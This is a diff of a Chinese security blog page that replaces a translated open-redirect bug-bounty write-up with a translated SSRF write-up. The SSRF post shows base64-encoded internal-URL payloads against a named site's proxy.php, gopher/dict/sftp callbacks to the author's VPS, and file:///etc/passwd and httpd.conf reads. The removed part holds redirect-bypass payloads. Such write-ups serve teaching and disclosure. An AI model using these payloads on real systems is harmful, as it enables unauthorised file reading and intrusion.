@@ -15,20 +15,25 @@
 
 
 
-<meta name="description" content="原文：Developers are lazy(or maybe busy)漏洞：@符绕过造成URL重定向作者：KatsuragiCSL难度：低">
+<meta name="description" content="原文：Server Side Request Forgery(SSRF) Testing漏洞：SSRF漏洞作者：NoGe难度：低">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第二篇翻译：URL重定向">
-<meta property="og:url" content="http://TimeS0ng.github.io/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/index.html">
+<meta property="og:title" content="第十四篇：SSRF读取本地文件">
+<meta property="og:url" content="http://TimeS0ng.github.io/2019/02/14/第十四篇：SSRF读取本地文件/index.html">
 <meta property="og:site_name" content="TimeS0ng&#39;s blog">
-<meta property="og:description" content="原文：Developers are lazy(or maybe busy)漏洞：@符绕过造成URL重定向作者：KatsuragiCSL难度：低">
+<meta property="og:description" content="原文：Server Side Request Forgery(SSRF) Testing漏洞：SSRF漏洞作者：NoGe难度：低">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_2/1.gif">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png">
-<meta property="og:updated_time" content="2019-01-25T01:06:30.982Z">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_14/1.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_14/2.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_14/3.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_14/4.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_14/5.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_14/6.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_14/7.png">
+<meta property="og:updated_time" content="2019-02-14T03:30:11.522Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="第二篇翻译：URL重定向">
-<meta name="twitter:description" content="原文：Developers are lazy(or maybe busy)漏洞：@符绕过造成URL重定向作者：KatsuragiCSL难度：低">
-<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_2/1.gif">
+<meta name="twitter:title" content="第十四篇：SSRF读取本地文件">
+<meta name="twitter:description" content="原文：Server Side Request Forgery(SSRF) Testing漏洞：SSRF漏洞作者：NoGe难度：低">
+<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_14/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -60,7 +65,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>第二篇翻译：URL重定向 | TimeS0ng&#39;s blog</title>
+<title>第十四篇：SSRF读取本地文件 | TimeS0ng&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -261,20 +266,20 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-第二篇翻译：Developers-are-lazy-or-maybe-busy" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-第十四篇：SSRF读取本地文件" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/" class="article-date">
-      <time datetime="2018-12-19T09:35:11.000Z" itemprop="datePublished">2018-12-19</time>
+      <a href="/2019/02/14/第十四篇：SSRF读取本地文件/" class="article-date">
+      <time datetime="2019-02-14T03:05:16.000Z" itemprop="datePublished">2019-02-14</time>
 </a>
 
  
-    <a href="/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/#comments" title="查看评论">
+    <a href="/2019/02/14/第十四篇：SSRF读取本地文件/#comments" title="查看评论">
         <i class="fa fa-comments-o" aria-hidden="true"></i>
         <span class="count-comment"></span>
         
         
-            <span class="disqus-comment-count" data-disqus-identifier="2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/"></span>
+            <span class="disqus-comment-count" data-disqus-identifier="2019/02/14/第十四篇：SSRF读取本地文件/"></span>
         
     </a>
 
@@ -289,7 +294,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      第二篇翻译：URL重定向
+      第十四篇：SSRF读取本地文件
     </h1>
   
 
@@ -306,10 +311,20 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h4 id="原文：Developers-are-lazy-or-maybe-busy"><a href="#原文：Developers-are-lazy-or-maybe-busy" class="headerlink" title="原文：Developers are lazy(or maybe busy)"></a>原文：<a href="https://medium.com/bugbountywriteup/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4" target="_blank" rel="external">Developers are lazy(or maybe busy)</a></h4><h4 id="漏洞：-符绕过造成URL重定向"><a href="#漏洞：-符绕过造成URL重定向" class="headerlink" title="漏洞：@符绕过造成URL重定向"></a>漏洞：@符绕过造成URL重定向</h4><h4 id="作者：KatsuragiCSL"><a href="#作者：KatsuragiCSL" class="headerlink" title="作者：KatsuragiCSL"></a>作者：KatsuragiCSL</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"><a href="#emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！" class="headerlink" title="&emsp;&emsp;这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"></a>&emsp;&emsp;这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！</h4><h4 id="emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："><a href="#emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：" class="headerlink" title="&emsp;&emsp;我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："></a>&emsp;&emsp;我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.example.com/account/login?next=https://www.example.com</div></pre></td></tr></table></figure>
-<h4 id="emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！"><a href="#emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！" class="headerlink" title="&emsp;&emsp;条件反射就想到了要去测试开放重定向这种类型的漏洞！"></a>&emsp;&emsp;条件反射就想到了要去测试开放重定向这种类型的漏洞！</h4><h4 id="emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！"><a href="#emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！" class="headerlink" title="&emsp;&emsp;首先，我尝试了最常规的payload：https://www.example.com/account/login?next=https://google.com   遗憾的是这个payload并没有生效，我没有被重定向到Google去！"></a>&emsp;&emsp;首先，我尝试了最常规的payload：<a href="https://www.example.com/account/login?next=https://google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://google.com</a>   遗憾的是这个payload并没有生效，我没有被重定向到Google去！</h4><h4 id="emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用"><a href="#emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用" class="headerlink" title="&emsp;&emsp;然后，我又尝试另一个payload：https://www.example.com/account/login?next=https://example.com@google.com , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用"></a>&emsp;&emsp;然后，我又尝试另一个payload：<a href="https://www.example.com/account/login?next=https://example.com@google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://example.com@google.com</a> , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用</h4><h4 id="emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误"><a href="#emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误" class="headerlink" title="&emsp;&emsp;最后灵犀一点，我换成这个payload之后终于有了一点反应：https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https://example.com%2Cgoogle.com 并且浏览器还提示错误"></a>&emsp;&emsp;最后灵犀一点，我换成这个payload之后终于有了一点反应：<a href="https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com</a> 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：<a href="https://example.com%2Cgoogle.com" target="_blank" rel="external">https://example.com%2Cgoogle.com</a> 并且浏览器还提示错误</h4><h4 id="emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已"><a href="#emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已" class="headerlink" title="&emsp;&emsp;尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已"></a>&emsp;&emsp;尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已</h4><h4 id="emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com"><a href="#emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com" class="headerlink" title="&emsp;&emsp;所以我又构造了最终的payload：https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com"></a>&emsp;&emsp;所以我又构造了最终的payload：<a href="https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com</a></h4><h4 id="emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看"><a href="#emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看" class="headerlink" title="&emsp;&emsp;并且得到URL：https://example.com,@google.com 这其实就已经将我重定向到https://www.google.com了，不信你可以访问看看"></a>&emsp;&emsp;并且得到URL：<a href="https://example.com,@google.com" target="_blank" rel="external">https://example.com,@google.com</a> 这其实就已经将我重定向到<a href="https://www.google.com了，不信你可以访问看看" target="_blank" rel="external">https://www.google.com了，不信你可以访问看看</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_2/1.gif" alt=""></p>
-<h4 id="emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…"><a href="#emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…" class="headerlink" title="&emsp;&emsp;最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…."></a>&emsp;&emsp;最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词….</h4><h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+        <h4 id="原文：Server-Side-Request-Forgery-SSRF-Testing"><a href="#原文：Server-Side-Request-Forgery-SSRF-Testing" class="headerlink" title="原文：Server Side Request Forgery(SSRF) Testing"></a>原文：<a href="https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d" target="_blank" rel="external"><em>Server Side Request Forgery</em>(<em>SSRF</em>) Testing</a></h4><h4 id="漏洞：SSRF漏洞"><a href="#漏洞：SSRF漏洞" class="headerlink" title="漏洞：SSRF漏洞"></a>漏洞：SSRF漏洞</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
+<h4 id="我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去"><a href="#我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去" class="headerlink" title="我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去"></a>我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://playfreedownloadgames.com:2483/proxy.php?url=aHR0cDovL3d3dy50b3A4MHNnYW1lcy5jb20vc2l0ZS9jb250ZW50L3BhY21hbg==</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/1.png" alt=""></p>
+<h4 id="所以让我们尝试编码http-127-0-0-1-80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA"><a href="#所以让我们尝试编码http-127-0-0-1-80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA" class="headerlink" title="所以让我们尝试编码http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA=="></a>所以让我们尝试编码<a href="http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA==" target="_blank" rel="external">http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA==</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://playfreedownloadgames.com:2483/proxy.php?url=aHR0cDovLzEyNy4wLjAuMTo4MA==</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/2.png" alt=""></p>
+<h4 id="尝试一下443端口"><a href="#尝试一下443端口" class="headerlink" title="尝试一下443端口"></a>尝试一下443端口</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/3.png" alt=""></p>
+<h4 id="出现Bad-Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口"><a href="#出现Bad-Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口" class="headerlink" title="出现Bad Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口"></a>出现Bad Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gopher://my_vps_ip:1337/_pacenoge</div><div class="line">dict://my_vps_ip:1337</div><div class="line"> sftp://my_vps_ip:1337</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/4.png" alt=""></p>
+<h4 id="可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file-etc-passwd"><a href="#可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file-etc-passwd" class="headerlink" title="可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file:///etc/passwd"></a>可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file:///etc/passwd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:///etc/passwd</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/5.png" alt=""></p>
+<h4 id="接着我想看看httpd-conf"><a href="#接着我想看看httpd-conf" class="headerlink" title="接着我想看看httpd.conf"></a>接着我想看看httpd.conf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:///etc/httpd/conf/httpd.conf</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/6.png" alt=""></p>
+<h4 id="通过阅读httpd-conf文件我知道了web服务的根目录-home-playfreedownloadgames-public-html-所以我可以读取proxy-php的文件内容"><a href="#通过阅读httpd-conf文件我知道了web服务的根目录-home-playfreedownloadgames-public-html-所以我可以读取proxy-php的文件内容" class="headerlink" title="通过阅读httpd.conf文件我知道了web服务的根目录/home/playfreedownloadgames/public_html 所以我可以读取proxy.php的文件内容"></a>通过阅读httpd.conf文件我知道了web服务的根目录/home/playfreedownloadgames/public_html 所以我可以读取proxy.php的文件内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:////home/playfreedownloadgames/public_html/proxy.php</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/7.png" alt=""></p>
 
       
     </div>
@@ -318,13 +333,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/">第二篇翻译：URL重定向</a></p>
+        <p><span>本文标题:</span><a href="/2019/02/14/第十四篇：SSRF读取本地文件/">第十四篇：SSRF读取本地文件</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
-        <p><span>发布时间:</span>2018-12-19, 17:35:11</p>
-        <p><span>最后更新:</span>2019-01-25, 09:06:30</p>
+        <p><span>发布时间:</span>2019-02-14, 11:05:16</p>
+        <p><span>最后更新:</span>2019-02-14, 11:30:11</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/" title="第二篇翻译：URL重定向">http://TimeS0ng.github.io/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/02/14/第十四篇：SSRF读取本地文件/" title="第十四篇：SSRF读取本地文件">http://TimeS0ng.github.io/2019/02/14/第十四篇：SSRF读取本地文件/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2019/02/14/第十四篇：SSRF读取本地文件/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -336,16 +351,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/12/20/第三篇翻译：XXE漏洞/">
-                    第三篇翻译：XXE漏洞
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/12/19/第一篇翻译：Change-Anyone’s-profile-picture-Exploiting-IDOR/">
-                    第一篇翻译：越权漏洞
+                <a href="/2019/02/14/第十三篇：命令执行/">
+                    第十三篇：命令执行
                 </a>
             </div>
         
@@ -357,7 +366,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：Developers-are-lazy-or-maybe-busy"><span class="toc-number">1.</span> <span class="toc-text">原文：Developers are lazy(or maybe busy)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：-符绕过造成URL重定向"><span class="toc-number">2.</span> <span class="toc-text">漏洞：@符绕过造成URL重定向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：KatsuragiCSL"><span class="toc-number">3.</span> <span class="toc-text">作者：KatsuragiCSL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：低"><span class="toc-number">4.</span> <span class="toc-text">难度：低</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number"></span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"><span class="toc-number">1.</span> <span class="toc-text">  这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："><span class="toc-number">2.</span> <span class="toc-text">  我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！"><span class="toc-number">3.</span> <span class="toc-text">  条件反射就想到了要去测试开放重定向这种类型的漏洞！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！"><span class="toc-number">4.</span> <span class="toc-text">  首先，我尝试了最常规的payload：https://www.example.com/account/login?next=https://google.com   遗憾的是这个payload并没有生效，我没有被重定向到Google去！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用"><span class="toc-number">5.</span> <span class="toc-text">  然后，我又尝试另一个payload：https://www.example.com/account/login?next=https://example.com@google.com , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误"><span class="toc-number">6.</span> <span class="toc-text">  最后灵犀一点，我换成这个payload之后终于有了一点反应：https://www.example.com/account/login?next=https://www.example.com&next=https://google.com 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https://example.com%2Cgoogle.com 并且浏览器还提示错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已"><span class="toc-number">7.</span> <span class="toc-text">  尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com"><span class="toc-number">8.</span> <span class="toc-text">  所以我又构造了最终的payload：https://www.example.com/account/login?next=https://www.example.com&next=@google.com</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看"><span class="toc-number">9.</span> <span class="toc-text">  并且得到URL：https://example.com,@google.com 这其实就已经将我重定向到https://www.google.com了，不信你可以访问看看</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…"><span class="toc-number">10.</span> <span class="toc-text">  最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词….</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打赏译者"><span class="toc-number"></span> <span class="toc-text">打赏译者</span></a>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：Server-Side-Request-Forgery-SSRF-Testing"><span class="toc-number">1.</span> <span class="toc-text">原文：Server Side Request Forgery(SSRF) Testing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：SSRF漏洞"><span class="toc-number">2.</span> <span class="toc-text">漏洞：SSRF漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：NoGe"><span class="toc-number">3.</span> <span class="toc-text">作者：NoGe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：低"><span class="toc-number">4.</span> <span class="toc-text">难度：低</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去"><span class="toc-number">5.</span> <span class="toc-text">我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#所以让我们尝试编码http-127-0-0-1-80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA"><span class="toc-number">6.</span> <span class="toc-text">所以让我们尝试编码http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA==</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#尝试一下443端口"><span class="toc-number">7.</span> <span class="toc-text">尝试一下443端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#出现Bad-Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口"><span class="toc-number">8.</span> <span class="toc-text">出现Bad Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file-etc-passwd"><span class="toc-number">9.</span> <span class="toc-text">可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file:///etc/passwd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#接着我想看看httpd-conf"><span class="toc-number">10.</span> <span class="toc-text">接着我想看看httpd.conf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过阅读httpd-conf文件我知道了web服务的根目录-home-playfreedownloadgames-public-html-所以我可以读取proxy-php的文件内容"><span class="toc-number">11.</span> <span class="toc-text">通过阅读httpd.conf文件我知道了web服务的根目录/home/playfreedownloadgames/public_html 所以我可以读取proxy.php的文件内容</span></a></li></ol>
         
     </div>
     <style>
@@ -393,7 +402,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"第二篇翻译：URL重定向　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"第十四篇：SSRF读取本地文件　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -450,15 +459,13 @@
 
     <div class="scroll" id="post-nav-button">
         
